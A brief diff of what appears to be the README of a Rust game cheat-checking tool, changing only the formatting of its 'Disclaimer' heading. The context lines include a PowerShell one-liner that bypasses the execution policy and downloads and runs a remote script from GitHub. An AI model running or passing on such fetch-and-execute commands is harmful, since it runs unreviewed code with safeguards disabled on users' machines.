@@ -23,7 +23,7 @@ Copy and execute the following command:
 Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://raw.githubusercontent.com/WarRagon404/RustCheatChecker/refs/heads/main/main.ps1' -UseBasicParsing).Content
 ```
 
-**⚖️ Disclaimer**
+## **⚖️ Disclaimer**
 
 This tool is created for educational and research purposes only.
 
